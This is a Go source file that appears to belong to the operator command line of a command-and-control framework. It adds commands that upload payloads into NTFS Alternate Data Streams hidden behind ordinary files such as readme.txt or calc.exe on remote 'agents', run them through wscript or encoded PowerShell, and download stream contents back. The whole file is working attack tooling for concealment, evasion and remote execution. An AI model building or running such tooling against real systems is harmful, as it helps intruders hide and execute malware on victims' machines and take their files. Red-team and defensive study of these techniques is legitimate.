package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var adsCmd = &cobra.Command{
	Use:   "ads",
	Short: "NTFS Alternate Data Stream operations",
	Long:  "Write, read, or execute scripts stored in NTFS Alternate Data Streams.",
}

// ads write <agent-id> <local-file> <target:stream>
var adsWriteCmd = &cobra.Command{
	Use:   "write <agent-id> <local-file> <target:stream>",
	Short: "Write a file into an NTFS ADS on the agent",
	Long: `Upload a local file into an NTFS Alternate Data Stream on the target.

target:stream format: C:\windows\system32\calc.exe:hidden
The host file (calc.exe) must already exist on the target.
Use any extension on the stream name to control how it can be executed later.

Examples:
  ads write 7d019eb7 payload.js "C:\Users\Public\readme.txt:update.js"
  ads write 7d019eb7 script.ps1 "C:\ProgramData\log.dat:svc.ps1"`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		localPath := args[1]
		adsPath := args[2]

		data, err := os.ReadFile(localPath)
		if err != nil {
			printError(fmt.Sprintf("Cannot read local file: %v", err))
			os.Exit(1)
		}

		payload, _ := json.Marshal(map[string]interface{}{
			"destination_path": adsPath,
			"file_content":     data,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/upload",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("ADS write failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("ADS write failed: %s", msg))
			os.Exit(1)
		}
		printSuccess(fmt.Sprintf("Written %d bytes → %s", len(data), adsPath))
		if dataMap, ok := resp.Data.(map[string]interface{}); ok {
			if id, ok := dataMap["command_id"].(string); ok {
				printInfo(fmt.Sprintf("command_id: %s", id))
			}
		}
	},
}

// ads read <agent-id> <source:stream> <local-file>
var adsReadCmd = &cobra.Command{
	Use:   "read <agent-id> <source:stream> <local-file>",
	Short: "Read an NTFS ADS from the agent to a local file",
	Long: `Download the contents of an Alternate Data Stream from the target to your local machine.

Examples:
  ads read 7d019eb7 "C:\Users\Public\readme.txt:update.js" /tmp/recovered.js`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		adsPath := args[1]
		localDest := args[2]

		payload, _ := json.Marshal(map[string]string{
			"source_path":      adsPath,
			"destination_path": localDest,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/download",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("ADS read failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("ADS read failed: %s", msg))
			os.Exit(1)
		}
		printSuccess(fmt.Sprintf("ADS contents queued for download → %s", localDest))
		if dataMap, ok := resp.Data.(map[string]interface{}); ok {
			if id, ok := dataMap["command_id"].(string); ok {
				printInfo(fmt.Sprintf("command_id: %s", id))
			}
		}
	},
}

// ads exec <agent-id> <path:stream.js>   OR   ads exec <agent-id> --ads-path <path:stream.ext>
var adsExecCmd = &cobra.Command{
	Use:   "exec <agent-id> [<path:stream.ext>]",
	Short: "Execute a script stored in an NTFS ADS",
	Long: `Execute a script stored inside an NTFS Alternate Data Stream via LOLBin.

Supported extensions (determines which LOLBin is used):
  .js   → wscript.exe //E:jscript
  .vbs  → wscript.exe
  .ps1  → powershell.exe -EncodedCommand

Examples:
  ads exec 7d019eb7 "C:\Users\Public\readme.txt:update.js"
  ads exec 7d019eb7 --ads-path "C:\ProgramData\log.dat:svc.ps1"`,
	Args: cobra.RangeArgs(1, 2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}

		// Accept path as positional arg OR --ads-path flag
		adsPath, _ := cmd.Flags().GetString("ads-path")
		if adsPath == "" && len(args) >= 2 {
			adsPath = args[1]
		}
		if adsPath == "" {
			printError("ADS path required: provide as positional arg or --ads-path")
			os.Exit(1)
		}

		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		payload, _ := json.Marshal(map[string]string{"ads_path": adsPath})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/ads/exec",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("ADS exec failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("ADS exec failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		printSuccess(fmt.Sprintf("ADS exec queued: %s", adsPath))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
